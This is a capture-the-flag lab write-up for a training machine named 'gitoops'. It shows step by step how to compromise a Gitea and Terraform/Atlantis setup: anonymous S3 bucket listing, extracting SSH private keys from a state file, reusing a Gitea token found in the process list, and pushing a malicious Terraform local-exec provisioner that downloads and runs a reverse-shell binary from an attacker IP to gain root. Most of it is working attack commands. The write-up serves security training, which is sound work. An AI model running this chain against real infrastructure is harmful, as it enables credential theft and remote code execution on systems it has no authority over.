# URL
https://www.hacksmarter.org/courses/d6c75815-8e7b-4d90-9ebf-c619176ae2d9/take/gitoops
# Concept
* gitea hacking
* AWS S3 bucket enumeration
* terraform hacking
# Method of solve
## Starting Scans
* there are ports, `22` (SSH), `80` (HTTP), `443` (HTTPS), and `2222` (SSH) open
* when we inspect either webpage, it redirects us to the HTTPS version of the page
* the app we're dealing with is Gitea
* with a bit of poking around, we see that there's a `gitCorp/public` repo, as well as a user on the system `alexis`
## Initial Access
* in that repo, in the `settings.tf` file, there is reference to an AWS S3 bucket
* we use the following command to enumerate it:
```
aws s3 ls s3://gitoops-4ulyqvxd8nn6hlsc/ --no-sign-request
```
* this lets us know there's a `gitcorp` directory we can also look at
```
aws s3 ls s3://gitoops-4ulyqvxd8nn6hlsc/gitcorp/ --no-sign-request
```
* and this points to a file named `terraform.tfstate`. We can download it:
```
aws s3 cp s3://gitoops-4ulyqvxd8nn6hlsc/gitcorp/terraform.tfstate . --no-sign-requestaws
```
* among the contents of this file are several SSH private keys
* we copy their contents to create proper SSH private keys
* in reality, all 3 of the keys are valid with the `alexis` account on port `22`
```
echo -e '<KEY CONTENTS>' > private.key
```
* then login to the regular SSH port as `alexis` with the key
```
ssh alexis@gitoops.local -i private.key
```
* we're in...
## Privilege Escalation
* in the running processes, we see some tokens, a user, and a private repo for Gitea:
```
alexis@ip-10-1-156-67:~$ ps aux | grep atlantis
root         973  0.0  1.7 1260888 34136 ?       Ssl  05:19   0:00 /usr/local/bin/atlantis server --atlantis-url=http://atlantis.gitoops.local --gitea-base-url=http --gitea-base-url=https://gitoops.local --gitea-user=atlantis --gitea-token=6eceab1137146d06a70fdbd02abf3863186a088e --gitea-webhook-secret=82df5474-2933-11ef-9454-0242ac120002 --gitea-page-size=30 --repo-allowlist=gitoops.local/gitCorp/private --repo-config=/opt/atlantis/repo.yaml
```
* the important details are these:
```
--atlantis-url=http://atlantis.gitoops.local
--gitea-user=atlantis
--gitea-base-url=https://gitoops.local
--gitea-token=6eceab1137146d06a70fdbd02abf3863186a088e
--repo-allowlist=gitoops.local/gitCorp/private
```
* we have both a domain and a subdomain to add to our `/etc/hosts` file: `atlantis.gitoops.local` and `gitoops.local`
* if we supply the `gitea-token` and the `gitea-user` we will be able to access the `/gitCorp/private` repo
* let's clone the `/gitCorp/private` repo and see what's there:
```
GIT_SSL_NO_VERIFY=true git clone https://atlantis:6eceab1137146d06a70fdbd02abf3863186a088e@gitoops.local/gitCorp/private.git
```
* taking a look at the `README.md` file we can confirm that this repo is intended for the Terraform app, which manages automation between Git and cloud services, like AWS
* we'd like to use Terraform to perform actions on the webserver, but the `atlantis` user can't push commits:
```
curl -k -H "Authorization: token 6eceab1137146d06a70fdbd02abf3863186a088e" https://gitoops.local/api/v1/user/repos | jq
"name": "private",
    "full_name": "gitCorp/private",
    "description": "Private repository",
    "languages_url": "https://gitoops.local/api/v1/repos/gitCorp/private/languages",
    "html_url": "https://gitoops.local/gitCorp/private",
    "url": "https://gitoops.local/api/v1/repos/gitCorp/private",
    "link": "",
    "ssh_url": "ssh://gitea@gitoops.local:2222/gitCorp/private.git",
    "clone_url": "https://gitoops.local/gitCorp/private.git",
    "permissions": {
      "admin": false,
      "push": false,
      "pull": true
    },
```
* but we do see that we have an SSH url that we can use to clone the repo:
```
GIT_SSH_COMMAND="ssh -i $(pwd)/private.key -o IdentitiesOnly=yes" git clone ssh://gitea@gitoops.local:2222/gitCorp/private.git
```
* enter the repo directory and create a malicious Terraform config file, we'll call it `main.tf`, with the following contents:
```
resource "null_resource" "main" {
  provisioner "local-exec" {
    command = "wget http://10.200.38.235/rev.elf && chmod 777 rev.elf && ./rev.elf"
  }
}
```
* we'll create a branch, add our malicious file to the repo, and create a commit using `git`:
```
git checkout -b reverse
git add main.tf
git commit -m "added Terraform config"
GIT_SSH_COMMAND="ssh -i $(pwd)/../private.key -o IdentitiesOnly=yes" git push --set-upstream origin reverse
```
* finally, we need to do a pull request, but we can't use the Gitea website, but we can use the API:
```
curl -X POST -k https://gitoops.local/api/v1/repos/gitCorp/private/pulls -H "Authorization: token 6eceab1137146d06a70fdbd02abf3863186a088e" -H "Content-Type: application/json" -d '{"base": "main", "head": "reverse", "title": "Terraform revshell"}'
```
* the Terraform config file output can be seen at the subdomain on the website, `atlantis.gitoops.local`
* to trigger the Terraform actions, we have to leave a comment on the repo:
```
curl -X POST -k https://gitoops.local/api/v1/repos/gitCorp/private/issues/1/comments -H "Authorization: token 6eceab1137146d06a70fdbd02abf3863186a088e" -H "Content-Type: application/json" -d '{"body": "atlantis apply"}'
```
* we should receive a connection from the machine, and we are the `root` user
* finis
